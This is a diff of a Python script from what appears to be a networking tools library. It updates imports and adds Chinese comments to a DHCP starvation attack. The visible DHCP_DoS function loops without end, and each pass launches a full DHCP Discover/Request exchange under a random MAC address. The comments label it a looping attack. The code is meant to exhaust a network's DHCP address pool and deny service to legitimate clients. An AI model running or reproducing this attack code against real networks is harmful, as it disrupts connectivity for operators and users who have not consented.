@@ -15,9 +15,8 @@ from PyQYT.Network.Tools.Change_MAC_To_Bytes import Change_MAC_To_Bytes
 from PyQYT.Network.Tools.GET_MAC import GET_MAC
 from PyQYT.Network.Tools.Change_Chaddr_To_MAC import Change_Chaddr_To_MAC
 from PyQYT.Network.Tools.Random_MAC import Random_MAC
-
-from DHCP_Discover import DHCP_Discover_Sendonly
-from DHCP_Request import DHCP_Request_Sendonly
+from PyQYT.Network.DHCP.DHCP_Discover import DHCP_Discover_Sendonly
+from PyQYT.Network.DHCP.DHCP_Request import DHCP_Request_Sendonly
 
 def DHCP_Monitor_Control(pkt):
 	try:
@@ -68,14 +67,18 @@ def DHCP_Monitor_Control(pkt):
 		pass
 
 def DHCP_FULL_ONE(ifname, MAC, timeout = 5):
+	#进行一次DHCP全过程
 	Send_Discover = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(Global_IF,MAC))
 	Send_Discover.start()
+	#发送DHCP Discover
 	sniff(prn=DHCP_Monitor_Control, filter="port 68 and port 67", store=0, iface=Global_IF, timeout = timeout)
+	#接收DHCP OFFER，并且回送DHCP Request
 
 def DHCP_DoS(ifname):
 	global Global_IF
 	Global_IF = ifname
 	while True:
+		#循环攻击开始
 		DHCP_FULL_DOS = multiprocessing.Process(target=DHCP_FULL_ONE, args=(ifname,Random_MAC()))
 		DHCP_FULL_DOS.start()
 
